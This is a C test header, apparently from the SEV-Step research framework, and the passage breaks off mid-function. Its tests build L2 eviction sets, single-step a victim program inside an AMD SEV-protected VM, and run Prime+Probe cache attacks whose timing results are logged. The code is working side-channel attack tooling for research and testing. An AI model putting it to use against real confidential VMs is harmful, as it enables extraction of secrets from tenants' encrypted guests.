#ifndef CACHE_ATTACK_TESTS_H
#define CACHE_ATTACK_TESTS_H

#include <stdio.h>

#include "../../sev-step-lib/ansi-color-codes.h"
#include "../../sev-step-lib/sev_step_api.h"
#include "my-error-codes.h"
#include "vm-server-client.h"
#include "../../sev-step-lib/sev_step_eviction_set_builders.h"
#include "../../sev-step-lib/sev_step_pagemap_parser.h"
#include "../../sev-step-lib/sev_step_cache_attack_log.h"
#include "../../sev-step-lib/sev_step_print_macros.h"

#include "cache_attack_helpers.h"

#include <sys/mman.h>

/**
 * @brief Test importing and freeing an eviction set using the kernel api
 * 
 * @param fp 
 * @param _args 
 * @return int HOST_CLIENT_SUCCESS or HOST_CLIENT_ERROR
 */
int test_import_free_user_evs(char* fp,void* _args) {
    (void)_args;
    int exit_code = HOST_CLIENT_SUCCESS;
    bool api_open = false;


    //
    //Preparing eviction set in user space. Target does not matter. Just need the data structure to have something to
    //import into the kernel
    //

    const int victim_table_buffer_bytes = 2 * 4096;
    void* victim_table = mmap(NULL,victim_table_buffer_bytes,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, 0, 0);
   

    lookup_table_t combined_lut = {
        .base_vaddr_table = (uint64_t)victim_table,
        .table_bytes = 4096 + (2*64)
    };
    lookup_table_t sub_luts[] = {
        {
            .base_vaddr_table = combined_lut.base_vaddr_table,
            .table_bytes = 4096 - (2 * 64),
        },
        {
            .base_vaddr_table = combined_lut.base_vaddr_table + 4096 - (2 * 64),
            .table_bytes = 4*64,
        }
    };
    lookup_table_eviction_set_t lookup_table_eviction_set;
    lookup_table_eviction_set_t* sub_evs = NULL;
    uint8_t** eviction_set_base_mappings = NULL;
    uint64_t eviction_set_base_mappings_len;
    uint64_t way_count = 8;

    //N.B: We just want to get some real physical address here, as we do not use this
    //eviction set with a real target in the vm anyways
    uint64_t paddrs[2];
    if( virt_to_phys_user(&paddrs[0],getpid(),sub_luts[0].base_vaddr_table) ) {
        printf("%s%s:%d virt_to_phys_user failed\n",fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    if( virt_to_phys_user(&paddrs[1],getpid(),sub_luts[1].base_vaddr_table) ) {
        printf("%s%s:%d virt_to_phys_user failed\n",fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    paddrs[1] = paddrs[1] & ~0xfff;
    flf_printf("Allocating Eviction set combined lut. Paddrs: {0x%jx and 0x%jx}, length 0x%jx\n",paddrs[0],paddrs[1],combined_lut.table_bytes);
    if( SEV_STEP_ERR == epyc3_build_l2_eviction_set_for_lookup_table_parallel_reuse(paddrs,2,combined_lut.table_bytes,
        &lookup_table_eviction_set, &eviction_set_base_mappings, &eviction_set_base_mappings_len, way_count) ) {

        flf_printf("epyc3_build_l2_eviction_set_for_lookup_table:" BHRED " FAILED\n"reset);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    flf_printf("Done building combined ev\n");

    flf_printf("Calling split_large_ev_into_separate_luts\n");
  
    int err = split_large_ev_into_separate_luts(
        combined_lut,
        &lookup_table_eviction_set,
        sub_luts,
        sizeof(sub_luts)/sizeof(*sub_luts),
        &sub_evs,
        way_count
    );
    if( err == SEV_STEP_ERR ) {
        flf_printf("split_large_ev_into_separate_luts failed\n");
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }



    import_user_eviction_set_param_t api_params = {
        .attack_targets = sub_luts,
        .eviction_sets = sub_evs,
        .len = sizeof(sub_luts)/sizeof(*sub_luts),
        .way_count = way_count,
        .cache_attack_perf = host_os_l2_hit_from_l1_dc_miss,
    };
    printf("%s%s:%d Got %lu lut and %lu eviction sets with %lu entries each\n",
        fp,__FILE__,__LINE__,api_params.len,api_params.eviction_sets->eviction_sets_len,
        api_params.way_count);

    //
    // Call API
    //

    usp_poll_api_ctx_t ctx;
    printf("%s%s:%d Initializing API...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == usp_new_ctx(&ctx,false)) {
        printf("%s%s:%d" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d API initialization done!\n",fp,__FILE__,__LINE__);
    api_open = true;


    printf("%s%s:%d Calling sev_step_import_user_evs\n",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_import_user_evs(&ctx,&api_params) ) {
         printf("%s%s:%d sev_step_import_user_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Calling sev_step_free_evs\n",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_free_evs(&ctx) ) {
        printf("%s%s:%d sev_step_free_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }


    cleanup:
    munmap(victim_table,victim_table_buffer_bytes);
    if( eviction_set_base_mappings != NULL ) {
        epyc3_free_reuse_lookup_table_eviction_set(lookup_table_eviction_set,
            eviction_set_base_mappings, eviction_set_base_mappings_len
        );
    }

    if( sub_evs != NULL ) {
        free_sub_evs(sub_evs,sizeof(sub_luts)/sizeof(*sub_luts));
    }

    if( api_open ) {
        printf("%s%s:%d Closing API...\n",fp,__FILE__,__LINE__);
        if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
            printf("%s%s:%d " BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
            exit_code = HOST_CLIENT_ERROR;
        } else {
            printf("%s%s:%d API closed!\n",fp,__FILE__,__LINE__);
        }
    }
   

    return exit_code;
}

int test_build_free_kernel_aliasing_evs(char* fp, void* _args) {
    (void)_args;
    int exit_code = HOST_CLIENT_SUCCESS;
    bool api_open = false;

    //We need a real GPA for ev building -> request one from vm test server

    victim_program_data_t victim_program_data;
    printf("%s%s:%d calling vm_server_single_step_victim_init to prepare scenario\n",fp,__FILE__,__LINE__);
    if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_init(VICTIM_PROGRAM_SIMPLE_CACHE_VICTIM,&victim_program_data) ) {
        printf("%s%s:%d vm_server_single_step_victim_init " BRED "FAILED\n" reset,fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Victim program GPA is 0x%lx and VADDR is 0x%lx\n",fp,__FILE__,__LINE__,
        victim_program_data.gpa,victim_program_data.vaddr);
    printf("%s%s:%d Lookup table has GPA 0x%lx and VADDR 0x%lx and is 0x%lx bytes long\n",fp,__FILE__,__LINE__,
        victim_program_data.cache_attack_data->lookup_table_gpa,victim_program_data.cache_attack_data->lookup_table_vaddr,
        victim_program_data.cache_attack_data->lookup_table_bytes);

    //
    // Test
    // - Open API
    // - request ev set build
    // - free ev
    //


   
    usp_poll_api_ctx_t ctx;
    printf("%s%s:%d Initializing API...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == usp_new_ctx(&ctx,false)) {
        printf("%s%s:%d" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d API initialization done!\n",fp,__FILE__,__LINE__);
    api_open = true;



    lookup_table_t lut = {
        //GPA is correct here, need to refactor lookup_table_t to support both gpa and gva
        .base_vaddr_table = victim_program_data.cache_attack_data->lookup_table_gpa,
        .table_bytes = victim_program_data.cache_attack_data->lookup_table_bytes,
    };
    build_eviction_set_param_t build_ev_req = {
        .attack_targets = &lut,
        .attack_targets_len = 1,
        .cache_attack_perf = host_os_l2_hit_from_l1_dc_miss,
    };



    printf("%s%s:%d Requesting ev build...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == sev_step_build_alias_evs(&ctx,&build_ev_req)) {
        printf("%s%s:%d" BRED "sev_step_build_alias_evs failed."reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Requesting ev free..\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == sev_step_free_evs(&ctx)) {
        printf("%s%s:%d" BRED "usp_new_ctx sev_step_free_evs."reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }


    cleanup:
    if( api_open ) {
        printf("%s%s:%d Closing API...\n",fp,__FILE__,__LINE__);
        if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
            printf("%s%s:%d " BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
            exit_code = HOST_CLIENT_ERROR;
        } else {
            printf("%s%s:%d API closed!\n",fp,__FILE__,__LINE__);
        }
    }
   
    return exit_code;
}




typedef struct {
    /// @brief value for apic timer
    int timer_value;
    /// @brief timer value to force zero step
    int zero_step_timer_value;
    /// @brief if true, we assume that we have access to rip through
    /// sev snp debug a api
    bool check_debug_rip;
    /// @brief  attack target to request from the vm-server
    victim_program_t cache_attack_target;
} test_do_cache_attack_l2_args_t;
/**
 * @brief Test a realistic cache attack scenario : Single step target until memory access offset is 
 * reached. Then perform and evaluate cache attack using the data provided from the vm-server
 * 
 * @param fp 
 * @param void_args 
 * @return int 
 */
int test_do_cache_attack_l2(char* fp,void* void_args) {
    int exit_code = HOST_CLIENT_SUCCESS;
    bool api_open = false;
    cache_attack_logfile_t* cache_attack_log = NULL;
    uint8_t** ev1_base_mappings = NULL;
    uint64_t ev1_base_mappings_len;
    usp_poll_api_ctx_t ctx;
    victim_program_data_t *victim_program_data = NULL;

    test_do_cache_attack_l2_args_t *args = (test_do_cache_attack_l2_args_t *)void_args;

    //
    // Preparing eviction set in user space
    // - request data from test server
    // - translate gpa to hpa via kvm api
    // - build eviction set
    // - import eviction set into kernel
    //

    victim_program_data = malloc(sizeof(victim_program_data_t));
    printf("%s%s:%d calling vm_server_single_step_victim_init to prepare scenario\n",fp,__FILE__,__LINE__);
    if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_init(args->cache_attack_target,victim_program_data) ) {
        printf("%s%s:%d vm_server_single_step_victim_init " BRED "FAILED\n" reset,fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Victim program GPA is 0x%lx and VADDR is 0x%lx\n",fp,__FILE__,__LINE__,
        victim_program_data->gpa,victim_program_data->vaddr);
    printf("%s%s:%d Lookup table has GPA 0x%lx and VADDR 0x%lx and is 0x%lx bytes long\n",fp,__FILE__,__LINE__,
        victim_program_data->cache_attack_data->lookup_table_gpa,victim_program_data->cache_attack_data->lookup_table_vaddr,
        victim_program_data->cache_attack_data->lookup_table_bytes);


 
    printf("%s%s:%d Initializing API...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == usp_new_ctx(&ctx,args->check_debug_rip)) {
        printf("%s%s:%d" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d API initialization done!\n",fp,__FILE__,__LINE__);
    api_open = true;

    printf("%s%s:%d Translating lookup table GPA to HPA...\n",fp,__FILE__,__LINE__);
    uint64_t lookup_table_hpa;
    if( SEV_STEP_ERR == sev_step_gpa_to_hpa(&ctx,victim_program_data->cache_attack_data->lookup_table_gpa,
        &lookup_table_hpa) ) {

        printf("%s%s:%d : sev_step_gpa_to_hpa:" BHRED " FAILED\n"reset,fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d HPA for lookup table is 0x%lx...\n",fp,__FILE__,__LINE__,lookup_table_hpa);



   
    lookup_table_eviction_set_t lookup_table_eviction_set;
    uint64_t way_count = 8;

    printf("%s:%d: Allocating Eviction set for table...\n",__FILE__,__LINE__);
    if( SEV_STEP_ERR == epyc3_build_l2_eviction_set_for_lookup_table_parallel_reuse(&lookup_table_hpa,1,
        victim_program_data->cache_attack_data->lookup_table_bytes,
        &lookup_table_eviction_set, &ev1_base_mappings,&ev1_base_mappings_len ,way_count) ) {

        printf("%s%s:%d : epyc3_build_l2_eviction_set_for_lookup_table:" BHRED " FAILED\n"reset,fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

   
    lookup_table_eviction_set_t evs[] = {lookup_table_eviction_set};
    lookup_table_t luts[] = {
        {
        //TODO: refactor this. Our attack does not depend on vaddr. However, we also don't use this in kernel
        //attack code right now (so no harm done other than confusion)
        .base_vaddr_table = victim_program_data->cache_attack_data->lookup_table_vaddr,
        .table_bytes = victim_program_data->cache_attack_data->lookup_table_bytes,
        },
    };
    perf_ctl_config_t perf_counter = host_os_l2_miss_from_l1_dc_miss;
    import_user_eviction_set_param_t api_params = {
        .attack_targets = luts,
        .eviction_sets = evs,
        .len = 1,
        .way_count = way_count,
        .cache_attack_perf = perf_counter,
    };
    printf("%s%s:%d Got %lu lut and %lu eviction sets with %lu entries each\n",
        fp,__FILE__,__LINE__,api_params.len,api_params.eviction_sets->eviction_sets_len,
        api_params.way_count);

    printf("%s%s:%d Calling sev_step_import_user_evs\n",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_import_user_evs(&ctx,&api_params) ) {
         printf("%s%s:%d sev_step_import_user_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }


    flf_printf("Calling cache_attack_log_new_log\n");
    cache_attack_log = cache_attack_log_new_log(
        api_params.attack_targets,
        api_params.len,
        perf_counter.descriptive_name,
        way_count
    );
    if( cache_attack_log == NULL ) {
        printf("%s cache_attack_log_new_log " BRED " FAILED\n" reset,fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }


    /*
     * Perform Simple Prime and Probe Test
     * Now we have prepared our eviction set
     * Lets run the victim program and perform the cache attack
     * This is similar to test_single_step_nop_slide. However, we have additional logic to
     * do the cache attack
     */
     


    //
    // Exec track gpa of victim function and signal vm server to start victim program async
    // Then, enter main event loop
    //

    printf("%stracking gpa 0x%lx with mode %s\n",fp,victim_program_data->gpa,tracking_mode_to_string(KVM_PAGE_TRACK_EXEC));
    if( SEV_STEP_OK != track_page(&ctx,victim_program_data->gpa,KVM_PAGE_TRACK_EXEC) ) {
        printf("%sinitial track page for 0x%lx" BRED " FAILED\n" reset,fp,victim_program_data->gpa);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%scalling vm_server_single_step_victim_start\n",fp);
    if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_start(args->cache_attack_target) ) {
        printf("%svm_server_single_step_victim_start " BRED "FAILED\n" reset,fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%sentering main event loop\n",fp);



    usp_event_type_t event_type;
    void* event_buffer;

    //if true, the last page fault event belonged to the target pages
    bool on_victim_pages = false;

    uint64_t single_steps_on_target = 0;

    /*We expect the victim program do be done after this many events. Contains some slack to account for scheduling and zero steps
    vicim_program_data.expected_offsets_len is the exact number of instructions/single step events for the target
    */
    int upper_event_thresh = 20 * victim_program_data->expected_offsets_len;
    //if true, we have single stepped through the whole target program successfully
    bool finished_single_stepping_target = false;

    bool do_cache_attack_until_next_single_step = false;
    uint64_t expected_cache_attack_offset = 0;
    // do_cache_attack_until_next_single_step is true, this contains the index of the attacked lookup table
    uint64_t attacked_lookup_table = 0;

    //we use this to force some zero steps for each cache attack. We want to find out whether we can use
    //zero steps to repeatedly observe the same memory access
    int remaining_forced_zero_steps_for_cache_attack = 0;


    uint64_t cache_attack_counter = 0;
    uint64_t successful_cache_attacks = 0;

    for( int current_event_idx = 0; current_event_idx < upper_event_thresh && !finished_single_stepping_target; current_event_idx++) {

        printf("%sWaiting next event, event_idx=%d\n",fp,current_event_idx);
        if( SEV_STEP_ERR == usp_block_until_event(&ctx,&event_type,&event_buffer) ) {
            printf("%susp_block_until_event" BRED " FAILED\n" reset,fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        
        if( event_type == PAGE_FAULT_EVENT ) {
            usp_page_fault_event_t* pf_event = (usp_page_fault_event_t*)event_buffer;
            printf("%s Pagefault Event: {GPA:0x%lx}\n",fp,pf_event->faulted_gpa);

            if( on_victim_pages ) {
                if( pf_event->faulted_gpa == victim_program_data->gpa ) {
                    printf("%s on_victim_pages=true but got fault for victim page! This should not happen\n",fp);
                    exit_code = HOST_CLIENT_ERROR;
                    goto cleanup;
                } else {
                    printf("%s Left victim pages with fault at GPA 0x%lx. Disabling single stepping and re-tracking victim pages\n",
                        fp,pf_event->faulted_gpa);
                    if( SEV_STEP_OK != disable_single_stepping(&ctx) ) {
                        printf("%sfailed to disable single stepping\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    //track only the target page
                    if( SEV_STEP_OK != untrack_all_pages(&ctx,KVM_PAGE_TRACK_EXEC)) {
                        printf("%suntrack_all_pages failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if( SEV_STEP_OK != track_page(&ctx,victim_program_data->gpa,KVM_PAGE_TRACK_EXEC)) {
                        printf("%sfailed to to track victim page\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    on_victim_pages = false;
                }
            } else { //currently not on victim pages
                if( pf_event->faulted_gpa == victim_program_data->gpa ) {
                    printf("%s entering victim pages. enabling single stepping (timer 0x%x) and tracking all but the target page\n",
                        fp,args->timer_value);
                    
                    //track all pages but the target page
                    if( SEV_STEP_OK != track_all_pages(&ctx,KVM_PAGE_TRACK_EXEC)) {
                        printf("%strack_all_pages failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if( SEV_STEP_OK != untrack_page(&ctx,victim_program_data->gpa,KVM_PAGE_TRACK_EXEC)) {
                        printf("%suntrack_page failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    if( SEV_STEP_OK != enable_single_stepping(&ctx,args->timer_value,&(victim_program_data->gpa),1) ) {
                        printf("%sfailed to enable single stepping\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    on_victim_pages = true;
                } else {
                    printf("currently not on victim pages and page fault is not on victim pages : nothing to do\n");
                }
            }
        } else if( event_type == SEV_STEP_EVENT) {
            sev_step_event_t* step_event = (sev_step_event_t*)event_buffer;
            print_single_step_event(fp,step_event);
            
           

            if( !on_victim_pages ) {
                printf("%s on_victim_pages=false but single step event. This should not happen\n",fp);
                exit_code = HOST_CLIENT_ERROR;
                goto cleanup;
            }

            switch (step_event->counted_instructions) {
            case 0:

                if( do_cache_attack_until_next_single_step ) {
                    printf("%sZero Stepped, re-priming cache. Was forced zero-step? %d\n",fp, remaining_forced_zero_steps_for_cache_attack > 0);
                    if( SEV_STEP_OK != sev_step_do_cache_attack_next_step(&ctx,0,remaining_forced_zero_steps_for_cache_attack > 0,args->zero_step_timer_value)) {
                        printf("%sev_step_do_cache_attack_next_step failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if( remaining_forced_zero_steps_for_cache_attack > 0 ) {
                        remaining_forced_zero_steps_for_cache_attack -= 1;
                    }

                    int res = cache_attack_log_add_trace(
                        cache_attack_log,
                        attacked_lookup_table,
                        step_event->cache_attack_timings,
                        step_event->cache_attack_perf_values,
                        step_event->cache_attack_data_len,
                        expected_cache_attack_offset,
                        step_event->counted_instructions,
                        single_steps_on_target-1,
                        NULL
                    );
                    if( SEV_STEP_ERR == res ) {
                        printf("%scache_attack_log_add_trace failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                }

               

                break;
            case 1:
                single_steps_on_target += 1;

                if(step_event->cache_attack_timings != NULL ) {

                    if( remaining_forced_zero_steps_for_cache_attack > 0 ) {
                        flf_printf(BHRED  "WARNING: WANTED FORCED ZERO STEP GOT SINGLE STEP " reset);
                    }

                    print_cache_timings(fp,step_event->cache_attack_timings,
                        step_event->cache_attack_perf_values,step_event->cache_attack_data_len,
                        way_count,lookup_table_hpa,expected_cache_attack_offset
                    );

                    if( HOST_CLIENT_ERROR == can_distinguish_expected_offset(
                        fp,
                        step_event->cache_attack_timings,
                        step_event->cache_attack_perf_values,
                        step_event->cache_attack_data_len,
                        way_count,
                        expected_cache_attack_offset)) {

                        printf("%s: can_distinguish_expected_offset"BHRED"FAILED\n"reset,fp);
                        /*exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;*/
                    } else {
                        printf("%s "BHGRN"CACHE ATTACK SUCCEEDED"reset". Timing peak at expected offset!\n",fp);
                        successful_cache_attacks += 1;
                    }

                    flf_printf("Serializing cache trace to log datastructure\n");
                    int res = cache_attack_log_add_trace(
                        cache_attack_log,
                        attacked_lookup_table,
                        step_event->cache_attack_timings,
                        step_event->cache_attack_perf_values,
                        step_event->cache_attack_data_len,
                        expected_cache_attack_offset,
                        step_event->counted_instructions,
                        single_steps_on_target-2,
                        NULL
                    );
                    if( SEV_STEP_ERR == res ) {
                        printf("%scache_attack_log_add_trace failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup; 
                    }

                }
                do_cache_attack_until_next_single_step = false;

                if( args->check_debug_rip && (single_steps_on_target < victim_program_data->expected_offsets_len) ) {
                    if( !step_event->is_decrypted_vmsa_data_valid ) {
                        printf("%s"BHRED"NO VMSA DATA"reset" but check debug rip requested!\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    uint64_t expected_vaddr = victim_program_data->vaddr + victim_program_data->expected_offsets[single_steps_on_target-1];
                    uint64_t rip = step_event->decrypted_vmsa_data.register_values[VRN_RIP];
                    if( (rip >> 12) != (expected_vaddr >> 12 )) {
                         printf("%s"BHRED "vaddr check failed: page part of vaddr is wrong, single_steps_on_target = %ju,"
                            "expected vaddr 0x%lx got 0x%lx\n" reset,
                            fp,single_steps_on_target,expected_vaddr,rip);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if( rip != expected_vaddr ) {
                        printf("%s"BHRED "vaddr check failed:  single_steps_on_target = %ju,"
                            " page part correct, expected page offset 0x%lx got 0x%lx\n" reset,
                            fp,single_steps_on_target,expected_vaddr & 0xfff,rip & 0xfff);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    } 
                    printf("%s step event is at expected vaddr\n",fp);
                }

                if ( (single_steps_on_target-1) < victim_program_data->expected_offsets_len ) {
                    // Check if we should perform a cache attack. Remember. RIP points to next instruction
                    uint64_t assumed_offset = victim_program_data->expected_offsets[single_steps_on_target - 1];
                    int cache_attack_idx;
                    for( uint64_t i = 0; i < victim_program_data->cache_attack_data->len; i++) {
                        if( victim_program_data->cache_attack_data->offsets_with_mem_access[i] == assumed_offset ) {
                            do_cache_attack_until_next_single_step = true;
                            remaining_forced_zero_steps_for_cache_attack = 0;
                            cache_attack_counter += 1;
                            cache_attack_idx = i;
                            break;
                        }
                    }

                    if (do_cache_attack_until_next_single_step)
                    {
                        printf("%sRequesting Cache Attack\n", fp);
                        expected_cache_attack_offset = victim_program_data->cache_attack_data->mem_access_target_offset[cache_attack_idx];
                        printf("%s" BHYEL "Expecting an access to offset 0x%lx\n" reset, fp, expected_cache_attack_offset);
                        if (SEV_STEP_OK != sev_step_do_cache_attack_next_step(
                                               &ctx, attacked_lookup_table,
                                               remaining_forced_zero_steps_for_cache_attack > 0,
                                               single_steps_on_target - 1))
                        {
                            printf("%sev_step_do_cache_attack_next_step failed\n", fp);
                            exit_code = HOST_CLIENT_ERROR;
                            goto cleanup;
                        }
                    }
                }
                

              

                if( single_steps_on_target > victim_program_data->expected_offsets_len ) {
                    printf("%sFinished single stepping target program !\n",fp);
                    finished_single_stepping_target = true;
                }
               
                break;
            default:
                printf("%s" BHRED "MULTISTEP"reset,fp);
                exit_code = HOST_CLIENT_ERROR;
                goto cleanup;
                break;
            }       
        } else {
            printf("%s Unexpected event type! Aborting\n",fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        printf("%ssending ack for event_idx %d\n",fp,current_event_idx);
        free_usp_event(event_type, event_buffer);
        usp_ack_event(&ctx);
    } //end of main event loop
    
    
    if( SEV_STEP_OK != disable_single_stepping(&ctx) ) {
        printf("%sfailed to disable single stepping\n",fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Calling sev_step_free_evs\n",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_free_evs(&ctx) ) {
        printf("%s%s:%d sev_step_free_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%sClosing API...\n",fp);
    if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
        printf("%s" BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",fp);
        exit_code = HOST_CLIENT_ERROR;
        api_open = false;
        goto cleanup;
    } else {
        printf("%sAPI closed!\n",fp);
    }
    api_open = false;


    flf_printf("Writing cache attack log to file\n");

    char* base_path = "./build/logs/test_do_cache_attack_l2";
    char* victim_program_name;
    victim_program_to_str(args->cache_attack_target,&victim_program_name);
    const uint64_t cache_log_filename_max = strlen(base_path) + strlen(victim_program_name) + 20;
    flf_printf("cache_log_filename_max: %ju, base_path: %s, victim_program_name: %s\n",cache_log_filename_max, base_path, victim_program_name)
    char* cache_log_filename = malloc(sizeof(char) * cache_log_filename_max);
    int used_chars = snprintf(cache_log_filename, cache_log_filename_max,"%s_%s", base_path, victim_program_name);
    if( used_chars < 0 ) {
        flf_printf("snprintf failed\n");
        free(cache_log_filename);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    if( cache_log_filename_max < (uint64_t)used_chars ) {
        flf_printf("failed to create output file string\n");
        free(cache_log_filename);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    flf_printf("Writing cache_attack log to %s\n",cache_log_filename);
    if( SEV_STEP_ERR == cache_attack_log_to_file(cache_attack_log, cache_log_filename) ) {
        exit_code = HOST_CLIENT_ERROR;
        free(cache_log_filename);
        goto cleanup;
    }
    free(cache_log_filename);

    if( !finished_single_stepping_target ) {
        printf("%s" BHRED "Did not finish target!. Wanted %lu single step events on target, got only %ju\n" reset,
            fp,victim_program_data->expected_offsets_len,single_steps_on_target);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    };



  

    //
    // interact with the vm to ensure that it is not stuck
    //
    bool vm_alive = false;
    for( int retries = 1; !vm_alive && retries >= 0; retries--) {
        victim_program_data_t* _dummy = malloc(sizeof(victim_program_data_t));
        printf("%ssending dummy request to vm to ensure that it is alive and well\n",fp);
        if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_init(VICTIM_PROGRAM_NOP_SLIDE,_dummy) ) {
            printf("%sdummy request " BRED "FAILED. %d retries remaining\n" reset,fp,retries);
        } else {
            vm_alive = true;
        }
        free_victim_program_data_t(_dummy);
    }

    if( vm_alive ) {
            printf("%s VM seems to be alive and well\n",fp);
    } else {
            printf("%svm is stuck\n",fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
    }

    printf("%s" BHWHT " CACHE ATTACK " reset "%ju out of %ju cache attacks succeeded\n",fp, successful_cache_attacks, cache_attack_counter);

    cleanup:
    if( ev1_base_mappings != NULL ) {
        epyc3_free_reuse_lookup_table_eviction_set(lookup_table_eviction_set,ev1_base_mappings,ev1_base_mappings_len);
    }

    flf_printf("Freeing cache attack log datastructure\n");
    cache_attack_log_free(cache_attack_log);

    if(victim_program_data != NULL ) {
        free_victim_program_data_t(victim_program_data);
    }

    if( api_open ) {
        printf("%s%s:%d Closing API...\n",fp,__FILE__,__LINE__);
        if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
            printf("%s%s:%d " BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
            exit_code = HOST_CLIENT_ERROR;
        } else {
            printf("%s%s:%d API closed!\n",fp,__FILE__,__LINE__);
        }
    }
   

    return exit_code;
}





typedef struct {
    /// @brief value for apic timer
    int timer_value;
    /// @brief if true, we assume that we have access to rip through
    /// sev snp debug a api
    bool check_debug_rip;
} test_do_cache_attack_kernel_aliasing_args_t;
/**
 * @brief Test a realistic cache attack scenario : Single step target until memory access offset is 
 * reached. Then perform and evaluate cache attack using the data provided from the vm-server
 * Use aliasing vaddr cache attack
 * 
 * This test only works with the kernel branch "paperExperimentAliasingCacheAttack"
 * 
 * @param fp 
 * @param void_args 
 * @return int 
 */
int test_do_cache_attack_kernel_aliasing(char* fp,void* void_args) {
    int exit_code = HOST_CLIENT_SUCCESS;
    bool api_open = false;

    test_do_cache_attack_kernel_aliasing_args_t* args = (test_do_cache_attack_kernel_aliasing_args_t*)void_args;

    usp_event_type_t event_type;
    void* event_buffer = NULL;
    //
    // Setup Eviction Set
    //
    victim_program_t victim_program = VICTIM_PROGRAM_SIMPLE_CACHE_VICTIM_LFENCE;
    victim_program_data_t* victim_program_data =  malloc(sizeof(victim_program_data_t));
    printf("%s%s:%d calling vm_server_single_step_victim_init to prepare scenario\n",fp,__FILE__,__LINE__);
    if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_init(victim_program,victim_program_data) ) {
        printf("%s%s:%d vm_server_single_step_victim_init " BRED "FAILED\n" reset,fp,__FILE__,__LINE__);
